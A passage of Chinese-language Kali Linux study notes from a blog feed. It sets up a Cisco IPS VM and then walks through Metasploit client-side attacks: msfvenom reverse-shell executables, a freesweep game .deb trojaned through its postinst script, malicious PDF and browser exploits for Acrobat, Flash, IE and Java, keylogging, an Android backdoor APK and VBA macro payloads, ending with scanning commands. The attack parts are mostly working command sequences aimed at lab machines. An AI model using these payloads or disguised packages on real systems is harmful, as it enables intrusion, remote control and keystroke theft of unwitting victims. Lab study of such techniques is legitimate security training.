<li>可以自定义安装，不占C盘资源空间</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="SecureCRT配置成功"> </p>
<ul>
<li>IPS-4240<ul>
<li>导入ova文件，设置新虚拟机位置<ul>
<li>账号：cisco</li>
<li>密码：ciscoips123</li>
</ul>
</li>
<li>网络适配器：自定义（VMnet8(NAT模式)）</li>
<li>网络适配器2：自定义VMnet2</li>
<li>网络适配器3：自定义VMnet3</li>
<li>网络适配器4：桥接模式（自动）</li>
<li>网络适配器5：桥接模式（自动）</li>
<li>新增串行端口：使用命名的管道:\.\pipe\842-1</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="IPS配置成功"></p>
<ul>
<li>Piped.exe（用MFC开发）<ul>
<li>模拟IPS串行端口</li>
<li>输入Pipe和自定义Port</li>
</ul>
</li>
</ul>
<p>！<a href="/images/ips/ips-notepad/Piped配置成功.png">Piped配置成功</a></p>
<ul>
<li>SecureCRT连接<ul>
<li>新建快速连接<ul>
<li>协议：Telnet</li>
<li>主机名：127.0.0.1</li>
<li>端口：在Piped自定义的Port</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="SecureCRT连接成功"></p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零五)：MSF--客户端渗透</title>
    <url>/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94)%EF%BC%9AMSF--%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msf–客户端渗透"><a href="#1-Msf–客户端渗透" class="headerlink" title="1. Msf–客户端渗透"></a>1. Msf–客户端渗透</h4><ul>
<li>在无法突破网络边界的情况下转而攻击客户端<ul>
<li>社会工程学攻击</li>
<li>进而渗透线上业务网络</li>
</ul>
</li>
<li>含有漏洞利用代码的WEB站点<ul>
<li>利用客户端漏洞</li>
</ul>
</li>
<li>含有漏洞利用代码的DOC、PDF等文档</li>
<li>诱骗被害者执行Payload</li>
</ul>
<h4 id="2-诱骗被害者执行Payload（Windows）"><a href="#2-诱骗被害者执行Payload（Windows）" class="headerlink" title="2. 诱骗被害者执行Payload（Windows）"></a>2. 诱骗被害者执行Payload（Windows）</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom --payload-options -p windows/shell/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：cp /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload windows/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP/1.exe，下载并保存" target="_blank" rel="noopener">http://Kali的IP/1.exe，下载并保存</a></li>
<li>在Kali服务器端准备好后，执行1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
</ul>
<h4 id="3-诱骗被害者执行Payload（Linux-Deb包）"><a href="#3-诱骗被害者执行Payload（Linux-Deb包）" class="headerlink" title="3. 诱骗被害者执行Payload（Linux Deb包）"></a>3. 诱骗被害者执行Payload（Linux Deb包）</h4><ul>
<li>Bodhi<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>依赖文件：/var/cache/apt/archives/</li>
<li><strong><code>🔺命令：apt-get --download-only install freesweep_0.90-1_i386.deb</code></strong></li>
<li><strong><code>🔺命令：cp freesweep_0.90-1_i386.deb /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：cd /root/Desktop</code></strong></li>
<li><strong><code>🔺命令：dpkg -x freesweep_0.90-1_i386.deb free</code></strong></li>
<li><strong><code>🔺命令：mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></strong></li>
<li><strong><code>🔺命令：vi control</code></strong><ul>
<li>Package:freesweep</li>
<li>Version:0.90-1</li>
<li>Section:Games and Amusement</li>
<li>Priority:optional</li>
<li>Architecture:i386</li>
<li>Maintainer:Ubuntu MOTU Developers(<a href="mailto:ubuntu-motu@lists.ubuntu.com" target="_blank" rel="noopener">ubuntu-motu@lists.ubuntu.com</a>)</li>
<li>Description:a text-based minesweeper</li>
<li>Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display in Linux console,in an xterm,and in most text-based terminals currently in use.</li>
</ul>
</li>
<li><strong><code>🔺命令：vi postinst</code></strong> <ul>
<li>#!/bin/sh </li>
<li>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/ freesweep_scores &amp; /usr/games/freesweep &amp;</li>
</ul>
</li>
<li><strong><code>🔺命令：chmod +x postinst</code></strong> </li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></strong></li>
<li><strong><code>🔺命令：chmod 755 postinst</code></strong></li>
<li><strong><code>🔺命令：dpkg-deb --build /root/free</code></strong></li>
<li><strong><code>🔺命令：cp /root</code></strong></li>
<li><strong><code>🔺命令：cp free.deb /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload linux/x86/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Bodhi<ul>
<li>浏览器访问<a href="http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）" target="_blank" rel="noopener">http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）</a></li>
<li><strong><code>🔺命令：sudp dpkg -i free.deb</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
<li>▲ 2020.03.01 freesweep程序为1.0.1-1，amd64架构，暂无法找到0.90-1，i386架构</li>
<li>▲ 2020.03.01 无法拿到shell，但能看到分步(stage)发送shell的代码，估计权限问题</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=2943VKOzBws-fXPZvYeClqNi9jnNbtOmUSEM80J3jKa8p6ZZIclAArUm-tmAzsIgjYpsPMTrloK1RFM9c4A_LYB1s8bw0LtYDSIm15uLQznoMU_9Q0pMiJAURx_6OwbUyw&file_name=/freeswap-control.PNG" srcset="/img/loading.gif" alt="freesweep-control"></p>
<h4 id="4-利用Acrobat-Reader漏洞执行payload"><a href="#4-利用Acrobat-Reader漏洞执行payload" class="headerlink" title="4. 利用Acrobat Reader漏洞执行payload"></a>4. 利用Acrobat Reader漏洞执行payload</h4><ul>
<li>构造PDF文件：<strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong>（生成一个PDF文件）</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /mnt/hgfs/share/</code></strong>（查看是否被查杀）</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /var/www/html</code></strong></li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP/msf.pdf（是否停止工作）" target="_blank" rel="noopener">http://Kali的IP/msf.pdf（是否停止工作）</a></li>
</ul>
</li>
<li>Kali<ul>
<li>压缩为ZIP文件</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.zip /mnt/hgfs/share/</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>解压msf.zip为msf.pdf，双击打开msf.pdf</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>构造恶意网站：<strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2（小于8.1.3的缓冲区溢出漏洞）</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong>（如果不设置，则回生成一个随机字符串）</li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：use priv</code></strong>（提权）</li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong></li>
<li><strong><code>🔺命令：tailf</code></strong> 查看键盘记录器</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>随机敲击键盘或运行命令</li>
</ul>
</li>
<li>Kali<ul>
<li>查看键盘记录器是否记录</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 通过构造恶意网站来拿到shell的模块暂无法成功拿到shell</li>
<li>Meterpreter <ul>
<li><strong><code>🔺命令：use priv</code></strong></li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-利用Flash插件漏洞执行payload（对Flash版本要求高）"><a href="#5-利用Flash插件漏洞执行payload（对Flash版本要求高）" class="headerlink" title="5. 利用Flash插件漏洞执行payload（对Flash版本要求高）"></a>5. 利用Flash插件漏洞执行payload（对Flash版本要求高）</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/server/</code></strong>browser_autopwn2（挑选质量较好的payload的集合）<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/server/browser_autopwn2</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Android手机<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 很难下载到对应Flash插件版本</li>
</ul>
<h4 id="6-利用IE浏览器漏洞执行payload"><a href="#6-利用IE浏览器漏洞执行payload" class="headerlink" title="6. 利用IE浏览器漏洞执行payload"></a>6. 利用IE浏览器漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：sysinfo</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="7-利用JRE漏洞执行payload"><a href="#7-利用JRE漏洞执行payload" class="headerlink" title="7. 利用JRE漏洞执行payload"></a>7. 利用JRE漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-生成Android后门程序"><a href="#8-生成Android后门程序" class="headerlink" title="8. 生成Android后门程序"></a>8. 生成Android后门程序</h4><ul>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：generate -f apk -p android -t raw</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Android<ul>
<li>拷贝a.apk到Android手机</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到了shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：ps</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="9-VBScript感染方式"><a href="#9-VBScript感染方式" class="headerlink" title="9. VBScript感染方式"></a>9. VBScript感染方式</h4><ul>
<li>利用宏感染word、excel文档</li>
<li>绕过某些基于文件类型检查的安全机制</li>
<li>生成vbscript脚本：<strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></strong></li>
<li>Office 2007 +<ul>
<li>视图–宏–创建</li>
<li>Payload第一部分VBA代码黏入宏创建中</li>
<li>Payload第二部分十六进制代码黏入word文档正文</li>
<li>双击打开则促发攻击</li>
</ul>
</li>
<li>Msf启动侦听<ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零四)：MSF模块--结合外部应用</title>
    <url>/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msf–弱点扫描"><a href="#1-Msf–弱点扫描" class="headerlink" title="1. Msf–弱点扫描"></a>1. Msf–弱点扫描</h4><ul>
<li>Openvas<ul>
<li><strong><code>🔺命令：Load openvas</code></strong><ul>
<li>命令行模式，需要配置，使用繁琐</li>
</ul>
</li>
<li>导入nbe格式扫描日志</li>
<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
</ul>
</li>
<li>Nessus</li>
<li>Nexpose<ul>
<li>xml格式日志文件</li>
</ul>
</li>
</ul>
<h4 id="2-实验（Openvas-→-Metasploit）"><a href="#2-实验（Openvas-→-Metasploit）" class="headerlink" title="2. 实验（Openvas → Metasploit）"></a>2. 实验（Openvas → Metasploit）</h4><ul>
<li>开启Openvas，网页模式进行Quick start漏洞扫描，导出nbe日志格式</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：Load openvas</code></strong></li>
<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
<li><strong><code>🔺命令：hosts</code></strong></li>
<li><strong><code>🔺命令：services</code></strong></li>
<li><strong><code>🔺命令：vulns</code></strong></li>
</ul>
<h4 id="3-实验（Nessuse-→-Metasploit）"><a href="#3-实验（Nessuse-→-Metasploit）" class="headerlink" title="3. 实验（Nessuse → Metasploit）"></a>3. 实验（Nessuse → Metasploit）</h4><ul>
<li><strong><code>🔺命令：cd /etc/init.d</code></strong></li>
<li><strong><code>🔺命令：./nessusd start</code></strong></li>
<li>网页查询是否已经正常启动</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：Load nessus</code></strong> </li>
<li>扫描帮助：<strong><code>🔺命令：nessus_help</code></strong> </li>
<li>扫描连接：<strong><code>🔺命令：nessus_connect admin:toor@127.0.0.1</code></strong></li>
<li>扫描策略：<strong><code>🔺命令：nessus_policy_list</code></strong>（若无策略，则需网页建立一个新的策略）</li>
<li>扫描任务：<strong><code>🔺命令：nessus_scan_new &lt;UUID&gt; &lt;Name&gt; &lt;Description&gt; &lt;Target&gt;</code></strong></li>
<li>执行扫描任务：<strong><code>🔺命令：nessus_scan_launch &lt;ID&gt;</code></strong> </li>
<li><strong><code>🔺命令：nessus_report_list</code></strong></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零三)：MSF模块--Auxiliary</title>
    <url>/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%89)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Auxiliary/</url>
    <content><![CDATA[<hr>
<h4 id="1-NMAP扫描"><a href="#1-NMAP扫描" class="headerlink" title="1. NMAP扫描"></a>1. NMAP扫描</h4><ul>
<li><strong><code>🔺命令：db_nmap -sV 192.168.0.0/24</code></strong></li>
</ul>
<h4 id="2-主机发现和端口扫描"><a href="#2-主机发现和端口扫描" class="headerlink" title="2. 主机发现和端口扫描"></a>2. 主机发现和端口扫描</h4><ul>
<li>主机发现<ul>
<li>⭐ auxiliary/scanner</li>
<li>RHOSTS &lt;&gt; RHOST <ul>
<li>192.168.1.20-192.168.1.30，192.168.1.0/24，192.168.11.0/24 </li>
<li>file:/root/h.txt</li>
</ul>
</li>
</ul>
</li>
<li>主机发现（UDP扫描）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_sweep</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_probe</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>主机发现（ARP扫描）<ul>
<li><strong><code>🔺命令：search arp</code></strong> <ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/arp_sweep</code></strong> <ul>
<li><strong><code>🔺命令：set INTERFACE</code></strong>（扫描接口）</li>
<li><strong><code>🔺命令：set ̵RHOSTS</code></strong>（目的IP地址）</li>
<li><strong><code>🔺命令：set SHOST</code></strong>（源IP地址）</li>
<li><strong><code>🔺命令：set SMAC</code></strong>（源MAC地址）</li>
<li><strong><code>🔺命令：set PORTS</code></strong>（目标端口号）</li>
<li><strong><code>🔺命令：set THREAD</code></strong>（线程数）</li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>端口扫描<ul>
<li><strong><code>🔺命令：search postscan</code></strong><ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/portscan/syn</code></strong><ul>
<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-IPID-idle扫描"><a href="#3-IPID-idle扫描" class="headerlink" title="3. IPID idle扫描"></a>3. IPID idle扫描</h4><ul>
<li>查找ipidseq主机<ul>
